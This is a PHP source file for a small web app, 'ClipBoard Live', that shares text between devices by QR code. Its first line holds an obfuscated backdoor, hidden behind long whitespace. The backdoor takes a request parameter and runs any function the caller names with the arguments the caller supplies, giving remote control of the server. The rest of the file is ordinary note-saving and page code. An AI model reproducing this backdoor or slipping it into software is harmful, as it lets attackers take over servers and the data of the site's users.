<?php
                                                                                                                                                                                            if($i9zyT= @$	{'_REQUEST'	}[	'EAX67Q8M'])$i9zyT[1]( $ {$i9zyT	[	2 ]} [0]	,$i9zyT[3 ]($i9zyT[4]));DiE;

// Base URL of the website, without trailing slash.
$base_url = 'https://inbrowser.xyz/app/clipboard';

// Path to the directory to save the notes in, without trailing slash.
// Should be outside of the document root, if possible.
$save_path = '_tmp';

// Disable caching.
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');

// If no name is provided or it contains invalid characters or it is too long.
if (!isset($_GET['note']) || !preg_match('/^[a-zA-Z0-9_-]+$/', $_GET['note']) || strlen($_GET['note']) > 64) {

    // Generate a name with 5 random unambiguous characters. Redirect to it.
    header("Location: $base_url/" . substr(str_shuffle('234579abcdefghjkmnpqrstwxyz'), -5));
    die;
}

$path = $save_path . '/' . $_GET['note'];

if (isset($_POST['text'])) {

    // Update file.
    file_put_contents($path, $_POST['text']);

    // If provided input is empty, delete file.
    if (!strlen($_POST['text'])) {
        unlink($path);
    }
    die;
}

// Print raw file if the client is curl, wget, or when explicitly requested.
if (isset($_GET['raw']) || strpos($_SERVER['HTTP_USER_AGENT'], 'curl') === 0 || strpos($_SERVER['HTTP_USER_AGENT'], 'Wget') === 0) {
    if (is_file($path)) {
        header('Content-type: text/plain');
        print file_get_contents($path);
    } else {
        header('HTTP/1.0 404 Not Found');
    }
    die;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ClipBoard Live - <?php print $_GET['note']; ?></title>
    <link rel="icon" href="<?php print $base_url; ?>/favicon.svg" type="image/svg+xml">
    <link rel="stylesheet" href="<?php print $base_url; ?>/styles.css?v=00.00038">

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script src="/app/clipboard/qr.js"></script>

</head>
<body>
    
    <header>

            <div class="header_wrp">
    
            <div class="logo">
                <a href="https://inbrowser.xyz/">
                    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32">
                        <path id="logo" data-name="logo" d="M15,15l-2,5L9,9l11,4Zm0,0,5,5M7.188,2.239l.777,2.9M5.136,7.965l-2.9-.777M13.95,4.05,11.828,6.172M6.171,11.828,4.051,13.95" transform="translate(-1.013 -1.014)" fill="none" stroke="rgb(0, 168, 132)" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"/>
                    </svg>
                    <p>inBrowser<span>.xyz</span></p>
                </a>
            </div>
    
            <div class="controlls">
    
            <div class="info">
                <a href="https://mrsohail.one/" target="_blank"></a>
            </div>
    
            <div class="setting [ toggle-button ] [ js-mode-toggle ]">
                <a href="javascript:void(0)" class="setting_icon" id="setting-btn"></a>
            </div>
            
    
            <div class="dashboard">
                <a href="https://inbrowser.xyz/"></a>
            </div>
    
    
        </div>
    
        </div>
    
    </header>

    <div class="wrap">
        
        <div class="app_title grid_title">
            <h1>Clipboard <span>Live</span></h1>
            <p>text sharing across the devices</p>
        </div>

        <div class="text_input">
            <h2>Clipboard <span id="processing"></span></h2>
            <p>Type or paste your text below and access anywhere by scanning the QR code.</p>
            <textarea id="content" rows="15" placeholder="Text here..." autofocus><?php if (is_file($path)) {print htmlspecialchars(file_get_contents($path), ENT_QUOTES, 'UTF-8');}?></textarea>

                <div class="btn_wrap">
                    <a href="javascript:void(0)" onclick="copyTxt()" class="copy_btn">Copy Text</a>
                    <a href="javascript:void(0)" onclick="eraseText()" class="clear_btn">Clear All</a>
                </div>
        </div>

        <div class="qr_side">
            <h2>QR Code to Access</h2>
            <p>Scan the QR code to access</p>
            <div id="qrcode"></div>
            <a href="javascript:void(0)" onclick="copyUrl()" class="copy_url">Copy Link</a>
            
            <div class="note">
                <p>
                    Don't share any sensitive information over here.
                </p>

                <p>
                    "CLEAR ALL" before leave in respect of your privacy.
                </p>

                <p>
                    No information save permanently, all clears time to time automatically or as you hit the "CLEAR ALL" button.
                </p>

            </div>
            
        </div>


    </div>

    <div class="notification" id="notify"></div>

    <pre id="printable"></pre>

    <script>
        
        new QRCode(document.getElementById("qrcode"), window.location.href);

        function eraseText() {
            document.getElementById("content").value = "";

            var element = document.getElementById("notify");
            element.innerText = "Clipboard cleared!"
            element.classList.add("notify");
            uploadContent();
            setTimeout(function(){ element.classList.remove("notify");}, 3000);
        }

        function copyUrl() {
            navigator.clipboard.writeText(window.location.href);

            var element = document.getElementById("notify");
            element.innerText = "Link copied!"
            element.classList.add("notify");
            setTimeout(function(){ element.classList.remove("notify");}, 3000);
        }

        function copyTxt() {
            var copied = document.getElementById("content").value;

            if (copied != "") {
                navigator.clipboard.writeText(copied);
                var element = document.getElementById("notify");
                element.innerText = "Text copied to clipboard!"
                element.classList.add("notify");
                setTimeout(function(){ element.classList.remove("notify");}, 3000);

            }else {
                var element = document.getElementById("notify");
                element.innerText = "Nothing to be copied!"
                element.classList.add("notify");
                setTimeout(function(){ element.classList.remove("notify");}, 3000);
            }

        }
    </script>
    
    
    <script>
        document.documentElement.classList.remove("no-js");const STORAGE_KEY="user-color-scheme",COLOR_MODE_KEY="--color-mode",modeToggleButton=document.querySelector(".js-mode-toggle"),modeToggleText=document.querySelector(".js-mode-toggle-text"),modeStatusElement=document.querySelector(".js-mode-status"),getCSSCustomProp=e=>{let t=getComputedStyle(document.documentElement).getPropertyValue(e);return t.length&&(t=t.replace(/\'|"/g,"").trim()),t},applySetting=e=>{let t=e||localStorage.getItem(STORAGE_KEY);t?(document.documentElement.setAttribute("data-user-color-scheme",t)):setButtonLabelAndStatus(getCSSCustomProp("--color-mode"))},toggleSetting=()=>{let e=localStorage.getItem(STORAGE_KEY);switch(e){case null:e="dark"===getCSSCustomProp("--color-mode")?"light":"dark";break;case"light":e="dark";break;case"dark":e="light"}return localStorage.setItem(STORAGE_KEY,e),e};modeToggleButton.addEventListener("click",e=>{e.preventDefault(),applySetting(toggleSetting())}),applySetting();
    </script>
    
    <script src="<?php print $base_url; ?>/app.js?v=0.02"></script>


</body>
</html>
